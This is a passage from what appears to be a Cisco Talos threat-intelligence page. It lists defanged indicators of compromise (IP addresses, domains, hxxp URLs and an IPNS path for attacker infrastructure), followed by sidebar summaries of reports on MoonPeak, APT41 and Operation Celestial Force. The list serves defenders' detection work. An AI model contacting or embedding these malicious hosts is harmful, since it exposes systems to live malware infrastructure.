IOCs&nbsp;</h2><p>213[.]139[.]205[.]23&nbsp;<br>dnsresolver[.]online&nbsp;<br>apisolving[.]com&nbsp;<br>hxxp[://]apisolving[.]com:443/DKgitTDJfiP&nbsp;<br>rdcservice[.]org&nbsp;<br>23[.]94[.]207[.]116&nbsp;<br>webtimeapi[.]com&nbsp;<br>91[.]92[.]242[.]87&nbsp;<br>wirelesszone[.]top&nbsp;<br>hxxp[://]wirelesszone[.]top:433/OfjdDebdjas&nbsp;<br>192[.]227[.]190[.]127&nbsp;<br>devhubs[.]dev&nbsp;<br>91[.]92[.]254[.]218&nbsp;<br>pos-st[.]top&nbsp;<br>hxxp[://]adcreative[.]pictures:443/kjLY1Ul8IMO&nbsp;<br>adcreative[.]pictures&nbsp;<br>91[.]92[.]248[.]75&nbsp;<br>creativeadb[.]com&nbsp;<br>94[.]156[.]68[.]216&nbsp;<br>hxxp[://]creativeadb[.]com:443/n9JTcP62OvC&nbsp;<br>193[.]42[.]36[.]131&nbsp;<br>copdaemi[.]top&nbsp;<br>adbefnts[.]dev&nbsp;<br>23[.]137[.]253[.]43&nbsp;<br>store-images[.]org&nbsp;<br>193[.]42[.]36[.]132&nbsp;<br>/ipns/k51qzi5uqu5dgn9wgsaxb7cfvinmk27eusoufaxrp8qd1ri5kamf41bg7gpydm</p>

                                        <h3>MoonPeak malware from North Korean actors unveils new details on attacker infrastructure</h3>
                                        <span  class="preview-attributes">August 21, 2024 06:00</span>
                                        <p>Cisco Talos has uncovered a new remote access trojan (RAT) family we are calling “MoonPeak.” This a XenoRAT-based malware, which is under active development by a North Korean nexus cluster we are calling “UAT-5394.”</p>
                                    </a>
                                </div>
                                <div class="sidebar-snippet-wrapper">
                                    <a href="/chinese-hacking-group-apt41-compromised-taiwanese-government-affiliated-research-institute-with-shadowpad-and-cobaltstrike-2/">
                                        <h3>APT41 likely compromised Taiwanese government-affiliated research institute with ShadowPad and Cobalt Strike</h3>
                                        <span  class="preview-attributes">August 1, 2024 08:00</span>
                                        <p>ShadowPad, widely considered the successor of PlugX, is a modular remote access trojan (RAT) only seen sold to Chinese hacking groups.</p>
                                    </a>
                                </div>
                                <div class="sidebar-snippet-wrapper">
                                    <a href="/cosmic-leopard/">
                                        <h3>Operation Celestial Force employs mobile and desktop malware to target Indian entities</h3>
                                        <span  class="preview-attributes">June 13, 2024 06:00</span>
                                        <p>Cisco Talos is disclosing a new malware campaign called “Operation Celestial Force” running since at least 2018. It is still active today, employing the use of GravityRAT, an Android-based malware, along with a Windows-based malware loader we track as “HeavyLift.”</p>
                                    </a>
                                </div>
                </div>
            </div>
        </div>
    </main>
